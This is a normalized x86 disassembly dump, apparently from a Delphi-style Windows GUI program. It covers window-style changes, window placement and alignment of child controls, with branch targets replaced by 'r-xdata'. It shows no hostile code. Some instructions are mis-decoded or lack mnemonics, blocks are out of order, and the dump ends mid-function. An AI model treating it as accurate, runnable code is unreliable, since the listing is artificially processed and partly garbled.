mov edx [ ebp - 0x4 ]
mov [ edx + 0x170 ] eax
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_434ac8
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x174 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov esp ebp
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x174 ] al
mov eax [ ebp - 0x4 ]
call sub_434bd8
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax [ ebp - 0x4 ]
call sub_42df28
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14c ]
push eax
call GetWindowLongA
and eax 0xfffeffff
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
push eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14c ]
push eax
call SetWindowLongA
or [ ebp - 0xc ] 0x10000
sub_434b4c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_434bcc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x17c ]
cmp al [ ebp - 0x5 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434bd3
lea eax [ ebp - 0xc ]
call sub_44e3d0
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x17c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
setne al
xor al 0x1
and al [ ebp - 0x5 ]
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov bx 0xffcd
call sub_44c24c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
add eax 0x148
call sub_44e3e8
sub_434bf8
push ebp
mov ebp esp
add esp 0xffffffbc
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14c ]
push eax
call IsIconic
test eax eax
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14c ]
push eax
call GetWindowRect
mov [ ebp - 0x44 ] 0x2c
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14c ]
push eax
call GetWindowPlacement
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
mov ecx 0x4
[ edi ] [ esi ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] eax
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x3c ] eax
mov eax [ ebp - 0x4 ]
call sub_42bdc0
pop edi
pop esi
mov esp ebp
pop ebp
retn
push 0xfffffff8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14c ]
push eax
call GetWindowLongA
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14c ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ScreenToClient
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ScreenToClient
sub_434cd8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
mov edx [ ebp - 0xc ]
call sub_43c464
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_43c264
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
mov bx 0xffb8
call sub_44c24c
inc [ ebp - 0xc ]
dec [ ebp - 0x14 ]
jne r-xdata
sub_434d48
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_434e63
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov bx 0xffb8
call sub_44c24c
mov eax [ ebp - 0x1c ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434e6a
mov eax [ ebp - 0x1c ]
call sub_44c070
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_43c504
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x9 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
inc [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x18 ] eax
jmp r-xdata
dec [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
call sub_43c464
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov bx 0xffbc
call sub_44c24c
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x174 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x24 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_434e74
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov al [ ebp + 0x8 ]
push eax
mov al [ ebp + 0x8 ]
xor al 0x1
push eax
mov cl [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_434d48
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xb0 ]
sub_434eb8
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_430844
dec eax
test eax eax
jl r-xdata
mov esp ebp
pop ebp
retn 0x8
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec [ ebp - 0x14 ]
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4307d8
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
sub_434f0c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_434274
jmp r-xdata
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_42ce08
sub_434f5c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42dcd8
mov [ ebp - 0xd ] al
mov al [ ebp - 0xd ]
mov esp ebp
pop ebp
retn
sub_434f84
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0xc ]
mov [ edx ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_435040
push ebp
mov ebp esp
add esp 0xffffff94
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_434bd8
test al al
je r-xdata
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
call sub_430844
test eax eax
je r-xdata
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x84 ]
lea eax [ ebp - 0x6c ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov edx [ ebp - 0x64 ]
sub edx [ ebp - 0x6c ]
sub eax edx
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
mov edx [ ebp - 0x60 ]
sub edx [ ebp - 0x68 ]
sub eax edx
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov edx [ ebp - 0x64 ]
sub edx [ ebp - 0x6c ]
sub eax edx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
mov edx [ ebp - 0x60 ]
sub edx [ ebp - 0x68 ]
sub eax edx
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
xor eax eax
push ebp
push sub_43546e
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x4 ]
call sub_430844
dec eax
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x1c ]
sub [ eax ] edx
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
inc eax
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x20 ] 0x0
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
push ebp
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x50 ]
push eax
lea ecx [ ebp - 0x4c ]
lea edx [ ebp - 0x44 ]
mov eax [ ebp - 0x54 ]
call sub_434f84
pop ecx
mov eax [ ebp - 0x54 ]
mov al [ eax + 0x4b ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x54 ]
test [ eax + 0x20 ] 0x10
je r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x54 ]
mov al [ eax + 0x51 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x20 ]
dec [ ebp - 0x5c ]
jne r-xdata
mov eax [ ebp - 0x54 ]
test [ eax + 0x41 ] 0x4
jne r-xdata
cmp [ ebp - 0x30 ] 0x0
jle r-xdata
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp - 0xc ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x55 ] 0x0
jmp r-xdata
mov [ ebp - 0x55 ] 0x1
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov [ ebp - 0x55 ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_4307d8
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x54 ]
cmp [ eax + 0x47 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp - 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x54 ]
mov al [ eax + 0x4b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov eax [ ebp - 0x64 ]
sub eax [ ebp - 0x6c ]
mov edx [ ebp - 0x54 ]
sub eax [ edx + 0x38 ]
sub eax [ ebp - 0x44 ]
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x55 ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
mov eax [ ebp - 0x30 ]
add eax [ ebp - 0x40 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x30 ]
add eax [ ebp - 0x40 ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x54 ]
mov al [ eax + 0x51 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x64 ]
sub eax [ ebp - 0x6c ]
add eax [ ebp - 0x48 ]
mov edx [ ebp - 0x54 ]
sub eax [ edx + 0x38 ]
mov [ ebp - 0x48 ] eax
jmp r-xdata
mov [ ebp - 0x55 ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov [ ebp - 0x56 ] 0x0
jmp r-xdata
mov [ ebp - 0x56 ] 0x1
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov [ ebp - 0x56 ] 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
mov al [ ebp - 0x55 ]
dec eax
sub al 0x2
jb r-xdata
cmp [ ebp - 0x50 ] 0x0
jle r-xdata
mov eax [ ebp - 0x60 ]
sub eax [ ebp - 0x68 ]
mov edx [ ebp - 0x54 ]
sub eax [ edx + 0x3c ]
sub eax [ ebp - 0x4c ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x56 ] 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x1c ]
add [ eax ] edx
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
je r-xdata
mov eax [ ebp - 0x60 ]
sub eax [ ebp - 0x68 ]
add eax [ ebp - 0x50 ]
mov edx [ ebp - 0x54 ]
sub eax [ edx + 0x3c ]
mov [ ebp - 0x50 ] eax
jmp r-xdata
mov [ ebp - 0x56 ] 0x3
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x44 ]
jge r-xdata
mov eax [ ebp - 0x54 ]
mov eax [ eax + 0x38 ]
add [ ebp - 0x34 ] eax
mov eax [ ebp - 0x54 ]
mov eax [ eax + 0x38 ]
add [ ebp - 0x38 ] eax
jmp r-xdata
mov al [ ebp - 0x56 ]
dec eax
sub al 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x44 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x24 ]
jle r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp + 0xc ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x50 ] 0x0
jle r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jge r-xdata
mov eax [ ebp - 0x54 ]
mov eax [ eax + 0x3c ]
add [ ebp - 0x3c ] eax
mov eax [ ebp - 0x54 ]
mov eax [ eax + 0x3c ]
add [ ebp - 0x40 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x50 ]
jle r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp - 0xc ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x50 ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x30 ]
jle r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x30 ] eax
jmp r-xdata
sub_435481
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_435040
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42ddd4
mov esp ebp
pop ebp
retn 0x8
sub_4354c8
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov cl [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42ef30
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x5c ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x150 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x150 ] 0x0
jne r-xdata
sub_435534
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx [ eax ]
call [ edx + 0x2c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_435568
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42f1b4
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x150 ]
mov eax [ ebp - 0x8 ]
call sub_404d9c
sub_4355a8
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_434bd8
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xa4 ]
lea edx [ ebp - 0x44 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
lea edx [ ebp - 0x44 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x84 ]
mov eax [ ebp - 0x4 ]
call sub_430280
xor eax eax
push ebp
push sub_435700
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_430844
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_430844
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435707
mov eax [ ebp - 0x4 ]
and [ eax + 0x44 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_430294
retn
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x4b ]
test al al
je r-xdata
mov eax [ ebp - 0x24 ]
test [ eax + 0x20 ] 0x10
je r-xdata
mov eax [ ebp - 0x34 ]
sub eax [ ebp - 0x44 ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec [ ebp - 0x20 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
test [ eax + 0x41 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x4b ]
sub al 0x3
jae r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4307d8
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
cmp [ eax + 0x47 ] 0x0
jne r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x30 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x3c ]
push eax
mov eax [ ebp - 0x24 ]
mov ecx [ eax + 0x34 ]
sub ecx [ ebp - 0x1c ]
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x30 ]
sub edx [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
mov ebx [ eax ]
call [ ebx + 0x7c ]
sub_435707
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x4b ]
test al al
je r-xdata
mov eax [ ebp - 0x2c ]
sub eax [ ebp - 0x34 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ ebp - 0x2c ]
sub eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x38 ]
mov edx [ ebp - 0x3c ]
sub edx [ ebp - 0x44 ]
sub eax edx
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4b ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x4b ]
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x28 ]
sub eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bx 0xffd5
call sub_44c24c
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov eax [ ebp - 0x28 ]
sub eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x3c ]
mov edx [ ebp - 0x38 ]
sub edx [ ebp - 0x40 ]
sub eax edx
mov edx [ ebp - 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4b ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov bx 0xffd5
call sub_44c24c
jmp r-xdata
sub_4357ac
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x12c ]
neg eax
